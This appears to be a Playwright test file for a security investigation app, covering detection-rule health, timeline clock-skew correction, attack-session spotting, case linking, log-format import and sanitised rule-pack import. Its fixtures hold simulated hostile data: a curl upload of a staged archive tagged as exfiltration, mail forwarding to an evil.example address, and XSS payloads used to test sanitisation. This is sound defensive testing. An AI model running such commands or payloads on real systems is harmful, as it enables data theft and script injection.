    dlAfterSave(r); dlAfterSave(r); r.code = code.replace('whoami.exe', 'whoam.exe'); dlAfterSave(r);
    const T = dlTrend(r);
    await ruleHealth(); const H1 = DQ.health, row = id => H1.rows.find(x => x.r.id === id);
    const first = { hist: r.testHist.map(h => h.pass + '/' + h.total), regressed: T.regressed, now: T.now, tfail: row('r-hw').tfail, regressedRow: row('r-hw').regressed,
      untested: !row('r-untested').tests && !row('r-untested').r.builtin };
    // fix it and add a noisy rule, check again: the change is reported
    r.code = code; dlAfterSave(r);
    DB.rules.unshift(mk('r-noise', 'Noise', "title: Noise\nlogsource:\n    product: windows\ndetection:\n    s:\n        _raw|contains: 'e'\n    condition: s\nlevel: low"));
    await ruleHealth(); const H2 = DQ.health, row2 = id => H2.rows.find(x => x.r.id === id);
    first.twin = (row2('r-twin').alike || []).map(a => a.id); first.notTwin = (row2('r-untested').alike || []).map(a => a.id);
    return { first, builtinAlike: H2.rows.filter(x => x.alike && x.r.builtin).length, trendAfterFix: dlTrend(r).now, prevAt: !!H2.prev, noisyBefore: H2.prev.noisy, noisyNow: H2.sum.noisy, tfailBefore: H2.prev.tfail, tfailNow: H2.sum.tfail, hist: DB.prefs.dqHist.length };
  });
  expect(R.first.hist).toEqual(['2/2', '2/2', '1/2']);
  expect(R.first.regressed).toBe(true); expect(R.first.now).toBe(false);
  expect(R.first.tfail).toBe(1); expect(R.first.regressedRow).toBe(true);
  expect(R.first.untested).toBe(true);
  expect(R.first.twin).toContain('r-hw');                    // same logic, different title
  expect(R.first.notTwin).not.toContain('r-hw');             // different program: not a look-alike
  expect(R.trendAfterFix).toBe(true); expect(R.builtinAlike).toBeLessThan(10);   // the built-in pack itself is not flagged wholesale
  expect(R.prevAt).toBe(true); expect(R.noisyNow).toBe(R.noisyBefore + 1); expect(R.tfailBefore).toBeGreaterThan(R.tfailNow);
  // on screen: the change line, the tabs, and the history strip in the rule's Tests tab
  await page.evaluate(() => { UI.dview = 'health'; UI.dqf = 'tests'; renderMain(); });
  await expect(page.locator('.dq-delta')).toContainText('noisy'); await expect(page.locator('.dq-delta')).toContainText('with failing tests');
  await page.click('[data-act=dqf][data-v=alike]'); await expect(page.locator('.dq-r:has(.dq-t b:text-is("Whoami run again"))')).toContainText('Nearly the same logic as');
  await page.click('[data-act=dqf][data-v=untested]'); await expect(page.locator('.dq-r:has-text("My untested rule") .chip')).toContainText(['no tests']);
  await page.evaluate(() => { UI.dview = 'rules'; UI.rule = 'r-hw'; UI.ropen = true; UI.rtab = 'tests'; renderMain(); });
  await expect(page.locator('.dl-hist i')).toHaveCount(4); await expect(page.locator('.dl-hist')).toContainText('Passing since');
  noErrors(errors);
});

test('timeline: a source whose clock is off is found (and normal jitter is not), corrected and undone; sessions show their stages in order', async ({ page }) => {
  const errors = await open(page, '#/home');
  await page.evaluate(() => {
    DB.cases.push({ id: 'c-tx', code: 'TX-1', name: 'Clocks', color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() });
    const T = Date.UTC(2024, 4, 2, 9), H = 36e5, M = 6e4; let i = 0;
    const mk = (src, t, title, body, host, tags) => ({ id: 'r-tx' + (i++), caseId: 'c-tx', type: 'evidence', title, body, ts: t, tsRaw: '', tsZone: 'explicit', source: src, host: host || '', tags: tags || [], ents: extractRich(body), addedAt: Date.now() });
    const R = [];
    // EDR sees connections; the firewall logs the same ones one hour later (its clock is in the wrong zone); DNS logs them seconds apart (normal)
    [['203.0.113.10', 0], ['198.51.100.7', 7], ['evil-cdn.example', 13], ['203.0.113.10', 31], ['198.51.100.7', 44]].forEach(([v, m]) => {
      R.push(mk('edr', T + m * M, 'Connection to ' + v, 'connect ' + v, 'WS-01'));
      R.push(mk('firewall', T + m * M + H + (m % 3) * 1000, 'Allowed ' + v, 'allow dst=' + v, 'FW'));
      R.push(mk('dns', T + m * M + 4000, 'Lookup ' + v, 'query ' + v, 'DNS1'));
    });
    // a session on WS-02: logon, discovery, staging, upload — then a quiet afternoon of ordinary events
    R.push(mk('sysmon', T + 2 * H, 'Logon', 'EventID=4624 TargetUserName=eve LogonType=10 logon', 'WS-02'));
    R.push(mk('sysmon', T + 2 * H + 3 * M, 'whoami /all', 'EventID=1 Image=C:\\Windows\\System32\\whoami.exe CommandLine="whoami /all"', 'WS-02', ['discovery']));
    R.push(mk('sysmon', T + 2 * H + 8 * M, '7z archive of shares', 'EventID=1 Image=C:\\Program Files\\7-Zip\\7z.exe CommandLine="7z a c:\\temp\\x.7z \\\\fs01\\finance"', 'WS-02', ['staging']));
    R.push(mk('sysmon', T + 2 * H + 12 * M, 'Upload', 'EventID=3 Image=C:\\Windows\\System32\\curl.exe CommandLine="curl -T c:\\temp\\x.7z https://files.example/up"', 'WS-02', ['exfiltration']));
    for (let k = 0; k < 4; k++) R.push(mk('sysmon', T + 6 * H + k * 20 * M, 'Word opened', 'EventID=1 Image=C:\\Program Files\\Microsoft Office\\WINWORD.EXE', 'WS-02'));
    DB.records.push(...R); rev++; DB.active = 'c-tx';
  });
  const A = await page.evaluate(() => { const D = derive('c-tx'), T = D.recs.filter(r => r.ts).sort((a, b) => a.ts - b.ts); return { skew: tx2Skew(T), sess: tx2Sessions(T).map(s => ({ host: s.host, n: s.n, steps: s.steps })) }; });
  expect(A.skew).toHaveLength(1);
  const sk = A.skew[0]; expect(sk.b).toBe('firewall'); expect(sk.others.sort()).toEqual(['dns', 'edr']); expect(sk.med).toBeGreaterThan(0); expect(Math.abs(Math.abs(sk.med) - 36e5)).toBeLessThan(5000); expect(Math.abs(sk.zone)).toBe(1);
  const ws2 = A.sess.find(s => s.host === 'WS-02'); expect(ws2.n).toBe(4);
  expect(ws2.steps.slice(0, 1)).toEqual(['Logon']); expect(ws2.steps).toEqual(expect.arrayContaining(['Discovery', 'Collection', 'Exfiltration']));
  expect(ws2.steps.indexOf('Discovery')).toBeLessThan(ws2.steps.indexOf('Collection')); expect(ws2.steps.indexOf('Collection')).toBeLessThan(ws2.steps.indexOf('Exfiltration'));
  expect(A.sess.some(s => s.n === 4 && s.steps.length === 0)).toBe(false);          // the ordinary afternoon is not listed
  // on screen, correct the clock, then undo
  await page.evaluate(() => { UI.tlMode = 'patterns'; go(caseHash('c-tx', 'timeline')); });
  await expect(page.locator('.tlx-c:has-text("Clocks that disagree")')).toContainText('time zone');
  await expect(page.locator('.tlx-c:has-text("Sessions")')).toContainText('WS-02');
  const fw0 = await page.evaluate(() => DB.records.find(r => r.source === 'firewall').ts);
  await page.locator('.tlx-c:has-text("Clocks that disagree") [data-act=tx2Shift]').first().click();
  await expect(page.locator('.tlx-c:has-text("Clocks that disagree")')).toHaveCount(0);
  const moved = await page.evaluate(() => { const r = DB.records.find(r => r.caseId === 'c-tx' && r.source === 'firewall') || DB.records.find(r => r.caseId === 'c-tx' && r.source === 'edr'); return r.tsShift; });
  expect(Math.abs(Math.abs(moved) - 36e5)).toBeLessThan(5000);
  await page.click('#toastBtn'); await expect(page.locator('.tlx-c:has-text("Clocks that disagree")')).toHaveCount(1);
  expect(await page.evaluate(() => DB.records.find(r => r.source === 'firewall').ts)).toBe(fw0);
  // show one session: the timeline filters to that host and time
  await page.locator('.tlx-c:has-text("Sessions") [data-act=tx2Sess]').first().click();
  expect(await page.evaluate(() => [UI.tlMode, UI.facet.host])).toEqual(['events', 'WS-02']);
  noErrors(errors);
});

test('blind spots of the same kind are grouped, previewed for noise, and one draft rule closes the whole group', async ({ page }) => {
  const errors = await open(page, '#/home');
  await page.evaluate(() => { UI.tlMode = 'rules'; UI.crf = 'blind'; go(caseHash('c-lantern', 'timeline')); });
  await expect(page.locator('.cr-sum')).toBeVisible({ timeout: 20000 });
  const G = await page.evaluate(() => CR.res.groups.map(g => ({ n: g.G.length, title: g.G[0].r.title, ok: g.ok, extra: g.extra, ids: g.G.map(x => x.r.id) })));
  const beacons = G.find(g => /beacon/i.test(g.title)); expect(beacons).toBeTruthy(); expect(beacons.n).toBeGreaterThanOrEqual(3); expect(beacons.ok).toBe(true);
  expect(G.every(g => g.n >= 2)).toBe(true);
  const card = page.locator('.cr-g', { hasText: beacons.title }).first();
  await expect(card).toContainText(beacons.n + ' alike');
  await expect(card).toContainText(beacons.extra ? 'would also match' : 'would match nothing else');
  const blind0 = await page.evaluate(() => CR.res.blind.length);
  await card.locator('[data-act=crDraftG]').click();
  await expect(page).toHaveURL(/#\/detections/);
  const rule = await page.evaluate(() => { const r = DB.rules[0]; return { tests: r.tests.filter(t => t.kind === 'hit').length, draft: r.tags.includes('draft') }; });
  expect(rule.draft).toBe(true); expect(rule.tests).toBe(Math.min(5, beacons.n));
  await page.evaluate(() => { UI.tlMode = 'rules'; go(caseHash('c-lantern', 'timeline')); });
  await expect.poll(() => page.evaluate(() => CR.res && CR.sig === crSig('c-lantern') && CR.res.blind.length)).toBe(blind0 - beacons.n);
  noErrors(errors);
});

test('a corrected clock shows on every event it touched, can be taken back from any of them, and survives export and import', async ({ page }) => {
  const errors = await open(page, '#/home');
  await page.evaluate(() => {
    DB.cases.push({ id: 'c-ts', code: 'TS-1', name: 'Clock', color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() });
    const T = Date.UTC(2024, 4, 2, 9); let i = 0; const mk = (src, t, b) => ({ id: 'r-ts' + (i++), caseId: 'c-ts', type: 'evidence', title: src + ' ' + i, body: b, ts: t, tsRaw: '', tsZone: 'explicit', source: src, host: 'H', tags: [], ents: extractRich(b), addedAt: Date.now() });
    for (const [m, v] of [[0, '203.0.113.10'], [5, '198.51.100.7'], [9, '203.0.113.10'], [14, '198.51.100.7']]) DB.records.push(mk('edr', T + m * 6e4, 'connect ' + v), mk('fw', T + m * 6e4 + 36e5, 'allow tcp 10.0.0.5:5000 -> ' + v + ':443'));
    rev++; DB.active = 'c-ts'; UI.tlMode = 'patterns'; go(caseHash('c-ts', 'timeline'));
  });
  await page.locator('.tlx-c:has-text("Clocks that disagree") [data-act=tx2Shift]').first().click();
  const shifted = await page.evaluate(() => DB.records.filter(r => r.caseId === 'c-ts' && r.tsShift).map(r => r.source));
  expect(shifted.length).toBe(4); expect(new Set(shifted).size).toBe(1);
  // the timeline marks each corrected event; the details panel explains and offers to take it back
  await page.evaluate(() => { UI.tlMode = 'events'; renderMain(); });
  await expect(page.locator('.tshift')).toHaveCount(4);
  const id = await page.evaluate(() => DB.records.find(r => r.caseId === 'c-ts' && r.tsShift).id);
  await page.evaluate(i => { UI.sel = { kind: 'rec', id: i }; UI.inspOpen = true; renderAll(); }, id);
  await expect(page.locator('.tshift-n')).toContainText('Time corrected by');
  await expect(page.locator('.tshift-n')).toContainText('recorded as');
  // export the case and import it back: the correction travels with it; junk values are dropped
  const back = await page.evaluate(() => { const r = normRecord({ title: 'x', body: '', ts: 5, tsShift: 'evil' }), r2 = normRecord({ title: 'x', body: '', ts: 5, tsShift: 9e12 }), r3 = normRecord({ title: 'x', body: '', ts: 5, tsShift: 36e5 }); return [r.tsShift, r2.tsShift, r3.tsShift]; });
  expect(back).toEqual([undefined, undefined, 36e5]);
  await page.locator('.tshift-n [data-act=tx2Unshift]').click();
  expect(await page.evaluate(() => DB.records.filter(r => r.caseId === 'c-ts' && r.tsShift).length)).toBe(0);
  await page.click('#toastBtn');
  expect(await page.evaluate(() => DB.records.filter(r => r.caseId === 'c-ts' && r.tsShift).length)).toBe(4);
  noErrors(errors);
});

test('the same run of stages on a second host, later, is pointed out; hosts that only log on are not', async ({ page }) => {
  const errors = await open(page, '#/home');
  const R = await page.evaluate(() => {
    DB.cases.push({ id: 'c-rp', code: 'RP-1', name: 'Repeat', color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() });
    const T = Date.UTC(2024, 4, 2, 9), M = 6e4, H = 36e5; let i = 0;
    const mk = (host, t, title, body, tags) => ({ id: 'r-rp' + (i++), caseId: 'c-rp', type: 'evidence', title, body, ts: t, tsRaw: '', tsZone: 'explicit', source: 'sysmon', host, tags: tags || [], ents: extractRich(body), addedAt: Date.now() });
    const run = (host, t0) => [mk(host, t0, 'Logon', 'EventID=4624 TargetUserName=eve LogonType=10 logon'), mk(host, t0 + 3 * M, 'whoami', 'EventID=1 Image=C:\\Windows\\System32\\whoami.exe', ['discovery']),
      mk(host, t0 + 8 * M, '7z', 'EventID=1 Image=C:\\Program Files\\7-Zip\\7z.exe', ['staging']), mk(host, t0 + 12 * M, 'upload', 'EventID=3 Image=curl.exe', ['exfiltration'])];
    DB.records.push(...run('WS-01', T), ...run('WS-02', T + 3 * H),
      mk('WS-03', T + H, 'Logon', 'EventID=4624 TargetUserName=bob LogonType=2 logon'), mk('WS-03', T + H + M, 'Logon', 'EventID=4624 TargetUserName=bob LogonType=2 logon'), mk('WS-03', T + H + 2 * M, 'Logon', 'EventID=4624 TargetUserName=bob LogonType=2 logon'),
      mk('WS-04', T + 5 * H, 'beacon', 'x', ['c2']), mk('WS-04', T + 5 * H + M, 'beacon', 'x', ['c2']), mk('WS-04', T + 5 * H + 2 * M, 'beacon', 'x', ['c2']));
    rev++; const D = derive('c-rp'), Ts = D.recs.filter(r => r.ts).sort((a, b) => a.ts - b.ts);
    return tx2Repeats(tx2Sessions(Ts)).map(x => ({ a: x.A.host, b: x.B.host, steps: x.steps, after: x.after }));
  });
  expect(R).toHaveLength(1);
  expect(R[0]).toMatchObject({ a: 'WS-01', b: 'WS-02', after: 3 * 36e5 });
  expect(R[0].steps).toEqual(['Logon', 'Discovery', 'Collection', 'Exfiltration']);
  await page.evaluate(() => { DB.active = 'c-rp'; UI.tlMode = 'patterns'; go(caseHash('c-rp', 'timeline')); });
  await expect(page.locator('.tx2-rep')).toContainText('WS-02 went through Logon → Discovery → Collection → Exfiltration 3h 0m after WS-01 did');
  await page.locator('.tx2-rep [data-act=tlxWin]').click();
  expect(await page.evaluate(() => [UI.tlMode, UI.facet.win.label])).toEqual(['events', 'WS-01 → WS-02']);
  noErrors(errors);
});

test('connected cases: shared malicious indicators and vault entries are a strong link; same /24 is weaker; private, benign and everywhere-things are not links', async ({ page }) => {
  const errors = await open(page, '#/home');
  const R = await page.evaluate(() => {
    const mkC = (id, code) => DB.cases.push({ id, code, name: code + ' — test', color: '#0ea5e9', status: 'active', created: Date.now(), updated: Date.now() });
    ['A', 'B', 'C', 'D'].forEach(x => mkC('c-' + x, 'LK-' + x));
    let i = 0; const rec = (c, body) => DB.records.push({ id: 'r-lk' + (i++), caseId: c, type: 'evidence', title: body.slice(0, 30), body, ts: Date.now(), tsRaw: '', source: 's', host: '', tags: [], ents: extractRich(body), addedAt: Date.now() });
    rec('c-A', 'beacon to 203.0.113.47 and lookup of evil-lamp.com, also 10.0.0.5 and mail via gmail.com, safe cdn.okfine.net');
    rec('c-B', 'seen 203.0.113.47 again, and 10.0.0.5, gmail.com, cdn.okfine.net');
    rec('c-C', 'scan from 203.0.113.99 and login.evil-lamp.com, gmail.com');
    rec('c-D', 'nothing shared except gmail.com');
    DB.verdicts = DB.verdicts || {}; DB.verdicts[entKey({ k: 'ipv4', v: '203.0.113.47' })] = 'malicious'; DB.verdicts[entKey({ k: 'domain', v: 'cdn.okfine.net' })] = 'benign';
    const en = (c, v) => DB.entries.push({ id: uid('e'), caseId: c, type: 'phone', fields: { number: v }, tags: [], notes: '', priority: 'medium', created: Date.now() });
    en('c-A', '+44 7700 900123'); en('c-B', '07700-900-123');
    rev++;
    const L = caseLinks('c-A').map(x => ({ code: x.c.code, strength: x.strength, shared: x.shared.map(s => s.kind + ':' + s.v), near: x.near.map(n => n.why) }));
    return { L, sample: caseLinks('c-A').some(x => x.c.sample) };
  });
  const B = R.L.find(x => x.code === 'LK-B'), C = R.L.find(x => x.code === 'LK-C');
  expect(R.L[0].code).toBe('LK-B'); expect(B.strength).toBe('strong');
  expect(B.shared).toEqual(expect.arrayContaining(['ind:203.0.113.47', 'vault:+44 7700 900123']));
  expect(B.shared.join()).not.toMatch(/10\.0\.0\.5|okfine|gmail/);          // private, benign, everywhere
  expect(C.strength).toBe('weak'); expect(C.near).toEqual(expect.arrayContaining(['same /24 network', 'same registered domain evil-lamp.com']));
  expect(R.L.some(x => x.code === 'LK-D')).toBe(false); expect(R.sample).toBe(false);
  await page.evaluate(() => go(caseHash('c-A', 'overview')));
  await expect(page.locator('.lk')).toContainText('LK-B'); await expect(page.locator('.lk .lk-c').first()).toContainText('Strong link');
  await page.locator('.lk [data-act=lkEnt]').first().click();
  expect(await page.evaluate(() => UI.sel && UI.sel.kind)).toBe('ent');
  noErrors(errors);
});

test('rule history: saves keep what they replace, two versions compare line by line, an old one goes back in the editor and is kept again on save', async ({ page }) => {
  const errors = await open(page, '#/detections');
  await page.locator('.page [data-act=rNew]').first().click(); await page.click('.ctx-it:has-text("Sigma")');
  await page.click('[data-rtab=history]'); await expect(page.locator('#dlPane')).toContainText('There are none yet');
  const v1 = await page.inputValue('#rCode');
  // save 1: a code change; save 2: a title change; save 3: nothing changed
  await page.click('[data-rtab=rule]'); await page.fill('#rCode', v1.replace(/condition: .*/, 'condition: selection\n# first edit')); await page.keyboard.press('Control+s');
  await page.fill('#rTitle', 'Renamed rule'); await page.keyboard.press('Control+s');
  await page.keyboard.press('Control+s');
  const n = await page.evaluate(() => rvList(DB.rules.find(r => r.id === UI.rule)).length); expect(n).toBe(2);
  await page.click('[data-rtab=history]');
  await expect(page.locator('.rv-t tbody tr')).toHaveCount(3);
  await expect(page.locator('form.rx')).not.toHaveClass(/dirty/);
  // compare the original with the editor: one added line and the title change
  await page.locator('.rv-t [data-act=rvPick][data-v="a:2"]').check();
  await expect(page.locator('.rv-sum')).toContainText('+1');
  await expect(page.locator('.rv-d .rv-l.add')).toContainText('# first edit');
  await expect(page.locator('.rv-m')).toContainText('Renamed rule');
  await expect(page.locator('form.rx')).not.toHaveClass(/dirty/);                  // picking versions is not an edit
  // put the original back: the editor holds it, unsaved; saving keeps the replaced version
  await page.locator('.rv-t tbody tr').nth(2).locator('[data-act=rvUse]').click();
  expect(await page.inputValue('#rCode')).toBe(v1); await expect(page.locator('form.rx')).toHaveClass(/dirty/);
  await page.keyboard.press('Control+s');                                              // focus is back in the editor, so the shortcut saves
  const after = await page.evaluate(() => { const r = DB.rules.find(r => r.id === UI.rule); return { code: r.code, n: rvList(r).length, last: rvList(r).slice(-1)[0].title }; });
  expect(after.code).toBe(v1); expect(after.n).toBe(3); expect(after.last).toBe('Renamed rule');
  // a bad history from an import is ignored, not trusted
  expect(await page.evaluate(() => rvList({ versions: [null, { code: 5, at: 1 }, { code: 'x', at: 0 }, { code: 'ok', at: 9 }] }).length)).toBe(1);
  noErrors(errors);
});

test('cloud, identity and network log files import as real events: CloudTrail, Okta, Microsoft 365 (CSV with AuditData), Zeek TSV and JSON, Windows XML exports', async ({ page }) => {
  const errors = await open(page, '#/home');
  const R = await page.evaluate(() => {
    const imp = (text, name) => { const P = logParse(text, name), cols = [...new Set(P.rows.slice(0, 200).flatMap(r => Object.keys(r)))], M = { time: logGuess(cols, 'time'), title: logGuess(cols, 'title'), host: logGuess(cols, 'host'), source: logGuess(cols, 'source') };
      const recs = P.rows.map(r => logRec(r, M, name)); return { fmt: P.fmt, cols: cols.filter(c => c.startsWith('__')).length, recs: recs.map(r => { const p = parseLog(r.body.length <= 20000 ? r.body : ''); return { title: r.title, ts: r.ts, format: p && p.format, user: p && p.norm.user, ip: p && p.norm['src.ip'], action: p && p.norm.action, status: p && p.norm.status }; }) }; };
    const ct = JSON.stringify({ Records: [
      { eventVersion: '1.08', userIdentity: { type: 'IAMUser', userName: 'ops-admin', arn: 'arn:aws:iam::111122223333:user/ops-admin' }, eventTime: '2024-03-01T10:00:00Z', eventSource: 'signin.amazonaws.com', eventName: 'ConsoleLogin', awsRegion: 'us-east-1', sourceIPAddress: '198.51.100.7', userAgent: 'Mozilla/5.0', errorMessage: 'Failed authentication', errorCode: 'Failed authentication', eventType: 'AwsConsoleSignIn' },
      { eventVersion: '1.08', userIdentity: { type: 'AssumedRole', principalId: 'AROA:dev', sessionContext: { sessionIssuer: { userName: 'deploy-role' } } }, eventTime: '2024-03-01T10:05:00Z', eventSource: 's3.amazonaws.com', eventName: 'PutBucketPolicy', sourceIPAddress: '203.0.113.9', requestParameters: { bucketName: 'prod-backups' } }] }, null, 2);
    const okta = JSON.stringify([{ uuid: 'a1', published: '2024-03-01T11:00:00.000Z', eventType: 'user.session.start', displayMessage: 'User login to Okta', actor: { id: '00u1', alternateId: 'eve@corp.example', type: 'User' }, client: { ipAddress: '45.33.32.156', userAgent: { rawUserAgent: 'curl/8.0' }, geographicalContext: { country: 'Netherlands' } }, outcome: { result: 'FAILURE', reason: 'INVALID_CREDENTIALS' } }]);
    const audit = { CreationTime: '2024-03-01T12:00:00', Operation: 'New-InboxRule', UserId: 'cfo@corp.example', Workload: 'Exchange', ClientIP: '[2001:db8::7]:51234', ResultStatus: 'True', Parameters: [{ Name: 'ForwardTo', Value: 'x@evil.example' }] };
    const m365 = 'CreationDate,UserIds,Operations,AuditData\r\n2024-03-01T12:00:00.0000000Z,cfo@corp.example,New-InboxRule,"' + JSON.stringify(audit).replace(/"/g, '""') + '"\r\n';
    const zeek = '#separator \\x09\n#set_separator\t,\n#empty_field\t(empty)\n#unset_field\t-\n#path\tconn\n#fields\tts\tuid\tid.orig_h\tid.orig_p\tid.resp_h\tid.resp_p\tproto\tservice\tduration\n#types\ttime\tstring\taddr\tport\taddr\tport\tenum\tstring\tinterval\n1709287200.123456\tCx1\t10.0.0.5\t51022\t203.0.113.47\t4444\ttcp\t-\t12.5\n1709287260.5\tCx2\t10.0.0.5\t51031\t203.0.113.47\t4444\ttcp\t-\t-\n#close\t2024-03-01-11-00-00';
    const zjson = '{"ts":1709287200.1,"uid":"Cd1","id.orig_h":"10.0.0.5","id.orig_p":5353,"id.resp_h":"8.8.8.8","id.resp_p":53,"proto":"udp","query":"update-lamp.test","qtype_name":"A"}\n{"ts":1709287201.2,"uid":"Cd2","id.orig_h":"10.0.0.5","id.orig_p":5354,"id.resp_h":"8.8.8.8","id.resp_p":53,"proto":"udp","query":"evil.example"}';
    const xml = '<?xml version="1.0" encoding="UTF-8"?>\n<Events>\n<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing"/><EventID>4625</EventID><TimeCreated SystemTime="2024-03-01T13:00:00.000Z"/><Computer>DC01</Computer></System><EventData><Data Name="TargetUserName">admin</Data><Data Name="IpAddress">198.51.100.7</Data><Data Name="LogonType">3</Data></EventData></Event>\n<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><EventID>4624</EventID><TimeCreated SystemTime="2024-03-01T13:01:00.000Z"/><Computer>DC01</Computer></System><EventData><Data Name="TargetUserName">admin</Data></EventData></Event>\n</Events>';
    return { ct: imp(ct, 'ct.json'), okta: imp(okta, 'okta.json'), m365: imp(m365, 'audit.csv'), zeek: imp(zeek, 'conn.log'), zjson: imp(zjson, 'dns.log'), xml: imp(xml, 'sec.xml') };
  });
  const t = s => Date.parse(s);
  // CloudTrail: who, what, from where, and that it failed
  expect(R.ct.recs).toHaveLength(2); expect(R.ct.cols).toBe(0);
  expect(R.ct.recs[0]).toMatchObject({ format: 'AWS CloudTrail · ConsoleLogin', user: 'ops-admin', ip: '198.51.100.7', action: 'ConsoleLogin', ts: t('2024-03-01T10:00:00Z') });
  expect(R.ct.recs[0].status).toMatch(/failure/); expect(R.ct.recs[0].title).toMatch(/ConsoleLogin.*ops-admin.*from 198\.51\.100\.7/);
  expect(R.ct.recs[1]).toMatchObject({ user: 'deploy-role', action: 'PutBucketPolicy' });
  // Okta
  expect(R.okta.recs[0]).toMatchObject({ format: 'Okta · User login to Okta', user: 'eve@corp.example', ip: '45.33.32.156', status: 'FAILURE', ts: t('2024-03-01T11:00:00Z') });
  // Microsoft 365 CSV export: the event inside AuditData is unpacked; the bracketed IPv6:port is cleaned
  expect(R.m365.fmt).toMatch(/AuditData/); expect(R.m365.recs).toHaveLength(1);
  expect(R.m365.recs[0].title).toMatch(/New-InboxRule/);
  expect(R.m365.recs[0].ts).toBe(t('2024-03-01T12:00:00Z'));
  // Zeek TSV: columns from #fields, "-" empty, epoch seconds read, comment lines skipped
  expect(R.zeek.fmt).toBe('Zeek conn'); expect(R.zeek.recs).toHaveLength(2);
  expect(R.zeek.recs[0].ts).toBe(1709287200123); expect(R.zeek.recs[0].title).toMatch(/10\.0\.0\.5:51022 → 203\.0\.113\.47:4444/);
  // Zeek JSON
  expect(R.zjson.recs[0].format).toBe('Zeek · dns'); expect(R.zjson.recs[0].ts).toBe(1709287200100);
  // Windows XML export: two events, each with its own time and a readable title
  expect(R.xml.fmt).toBe('Windows event XML'); expect(R.xml.recs).toHaveLength(2);
  expect(R.xml.recs[0].ts).toBe(t('2024-03-01T13:00:00Z')); expect(R.xml.recs[1].ts).toBe(t('2024-03-01T13:01:00Z'));
  expect(R.xml.recs[0].title).toMatch(/4625/);
  noErrors(errors);
});

test('rule packs: a downloaded zip comes back with tests and history; identical rules are skipped, clashes are your choice, and one Undo takes it all back', async ({ page }) => {
  const errors = await open(page, '#/detections');
  await page.evaluate(() => {
    const code = t => "title: " + t + "\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    s:\n        Image|endswith: '\\\\" + t.toLowerCase().replace(/\W+/g, '') + ".exe'\n    condition: s\nlevel: high";
    const mk = (id, t) => ({ id, type: 'sigma', title: t, desc: 'mine', code: code(t), severity: 'high', category: 'process', technique: '', author: 'You', platform: 'Windows', tags: [], created: Date.now(), updated: Date.now(),
      tests: [{ id: uid('t'), kind: 'hit', text: 'Image="C:\\\\x\\\\' + t.toLowerCase().replace(/\W+/g, '') + '.exe"' }] });
    const A = mk('r-pa', 'Pack Alpha'), B = mk('r-pb', 'Pack Bravo'); DB.rules.unshift(A, B);
    rvKeep(A, { ...A, code: A.code + '\n# v2' }); A.code += '\n# v2'; dlAfterSave(A);
    UI.dview = 'rules'; DB.prefs.rlay = 'table'; UI.dq = 'Pack '; UI.rpick = new Set(['r-pa', 'r-pb', DB.rules.find(r => r.builtin).id]); renderMain();
  });
  const dl = page.waitForEvent('download'); await page.click('[data-act=rbDl]'); const zip = await (await dl).path();
  // later: Alpha is gone, Bravo was rewritten here
  await page.evaluate(() => { DB.rules = DB.rules.filter(r => r.id !== 'r-pa'); const b = DB.rules.find(r => r.id === 'r-pb'); b.code = b.code.replace('high', 'low') + '\n# changed here'; UI.rpick = new Set(); mutate('t'); renderMain(); });
  const n0 = await page.evaluate(() => DB.rules.length);
  const fc = page.waitForEvent('filechooser'); await page.evaluate(() => importRules()); await (await fc).setFiles({ name: 'osintrix-rules-3.zip', mimeType: 'application/zip', buffer: require('fs').readFileSync(zip) });
  await expect(page.locator('#dlg .rp')).toBeVisible();
  await expect(page.locator('#dlg .tlx-kpi')).toContainText('1new');
  await expect(page.locator('#dlg .tlx-kpi')).toContainText('1already here');
  await expect(page.locator('#dlg .tlx-kpi')).toContainText('1same title, different logic');
  await page.selectOption('#dlg [data-rp="0"]', 'replace');
  await page.click('[data-act=rpGo]');
  const R = await page.evaluate(() => { const a = DB.rules.find(r => r.title === 'Pack Alpha'), b = DB.rules.find(r => r.id === 'r-pb');
    return { n: DB.rules.length, a: a && { tests: a.tests.length, versions: rvList(a).length, hist: dlHist(a).length, v2: a.code.includes('# v2') }, bCode: b.code.includes('# changed here'), bKept: rvList(b).some(v => v.code.includes('# changed here')), bravos: DB.rules.filter(r => /^Pack Bravo/.test(r.title)).length }; });
  expect(R.n).toBe(n0 + 1);
  expect(R.a).toEqual({ tests: 1, versions: 1, hist: 1, v2: true });
  expect(R.bCode).toBe(false); expect(R.bKept).toBe(true); expect(R.bravos).toBe(1);
  await page.click('#toastBtn');
  expect(await page.evaluate(() => [DB.rules.length, DB.rules.find(r => r.id === 'r-pb').code.includes('# changed here')])).toEqual([n0, true]);
  // a hostile or broken pack: nothing unsafe gets in
  const fc2 = page.waitForEvent('filechooser'); await page.evaluate(() => importRules());
  await (await fc2).setFiles({ name: 'bad.json', mimeType: 'application/json', buffer: Buffer.from(JSON.stringify([{ type: 'sigma', title: '<img src=x onerror=alert(1)>', code: 'detection:\n  s:\n    a: b\n  condition: s', refs: ['javascript:alert(1)', 'https://ok.example'], severity: 'apocalyptic', versions: [{ code: 5 }], testHist: [{ at: 1, pass: 9, total: 2 }] }, { type: 'evil', code: 'x' }, 'junk', null])) });
  await expect(page.locator('#dlg img')).toHaveCount(0); await page.click('[data-act=rpGo]');
  const bad = await page.evaluate(() => { const r = DB.rules[0]; return { title: r.title, refs: r.refs, sev: r.severity, v: rvList(r).length, h: dlHist(r).length }; });
  expect(bad).toEqual({ title: '<img src=x onerror=alert(1)>', refs: ['https://ok.example'], sev: 'medium', v: 0, h: 0 });
  noErrors(errors);
});
